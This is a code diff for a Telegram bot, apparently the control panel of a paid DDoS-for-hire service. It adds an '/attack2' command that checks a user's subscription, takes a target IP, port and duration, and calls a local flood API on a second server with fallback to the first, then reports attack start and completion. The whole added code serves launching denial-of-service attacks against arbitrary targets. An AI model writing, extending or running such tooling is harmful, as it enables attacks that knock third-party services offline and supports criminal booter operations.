@@ -184,6 +184,86 @@ def attack(m):
         print(f"[!] Attack error: {e}")
         bot.reply_to(m, "❌ **VPS OFFLINE!**\nCould not connect to API. `python3 api.py` start hai?")
 
+
+
+@bot.message_handler(commands=['attack2'])
+def attack2(m):
+    users = load_data(USERS_FILE)
+    user_id = str(m.from_user.id)
+
+    if user_id not in users or not users[user_id].get('active'):
+        return bot.reply_to(m, "❌ ACCESS DENIED! No active plan found.")
+
+    args = m.text.split()
+    if len(args) != 4:
+        return bot.reply_to(m, "❌ Format: /attack2 <IP> <PORT> <TIME>")
+
+    ip, port, attack_time = args[1], args[2], args[3]
+
+    API2_URL = "http://127.0.0.1:8081/hit"
+
+    try:
+        response = requests.get(
+            f"{API2_URL}?token={AUTH_TOKEN}&ip={ip}&port={port}&time={attack_time}",
+            timeout=10
+        )
+
+        if response.status_code == 200:
+            bot.reply_to(
+                m,
+                f"🚀 ATTACK STARTED (SERVER 2)\n"
+                f"🎯 Target: {ip}:{port}\n"
+                f"🕒 Time: {attack_time}s\n"
+                f"📶 Status: SERVER 2 ✅"
+            )
+
+            start_time = datetime.datetime.now()
+
+            def send_finish2():
+                end_time = datetime.datetime.now()
+                start_str = start_time.strftime("%d-%b-%Y %H:%M:%S IST")
+                end_str = end_time.strftime("%d-%b-%Y %H:%M:%S IST")
+
+                finish_msg = (
+                    f"✅ ATTACK COMPLETE (SERVER 2) ✅\n\n"
+                    f"🎯 Target: {ip}:{port}\n"
+                    f"⏱ Duration: {attack_time}s\n"
+                    f"🖥 Server: 2\n\n"
+                    f"📅 Started: {start_str}\n"
+                    f"📅 Completed: {end_str}\n\n"
+                    f"👑 DRX POWER"
+                )
+                try:
+                    bot.send_message(m.chat.id, finish_msg)
+                except Exception as e:
+                    print(f"[!] Finish error: {e}")
+
+            threading.Timer(int(attack_time), send_finish2).start()
+
+        else:
+            # Server 2 fail — Server 1 pe fallback
+            response = requests.get(
+                f"{API_URL}?token={AUTH_TOKEN}&ip={ip}&port={port}&time={attack_time}",
+                timeout=10
+            )
+            if response.status_code == 200:
+                bot.reply_to(m, f"🚀 ATTACK STARTED (SERVER 1 FALLBACK)\n🎯 {ip}:{port}\n🕒 {attack_time}s")
+
+    except Exception as e:
+        try:
+            response = requests.get(
+                f"{API_URL}?token={AUTH_TOKEN}&ip={ip}&port={port}&time={attack_time}",
+                timeout=10
+            )
+            if response.status_code == 200:
+                bot.reply_to(m, f"🚀 ATTACK STARTED (SERVER 1 FALLBACK)\n🎯 {ip}:{port}\n🕒 {attack_time}s")
+            else:
+                bot.reply_to(m, "❌ BOTH SERVERS OFFLINE")
+        except:
+            bot.reply_to(m, "❌ BOTH SERVERS OFFLINE")
+
+
+
 @bot.message_handler(commands=['myinfo'])
 def myinfo(m):
     users = load_data(USERS_FILE)
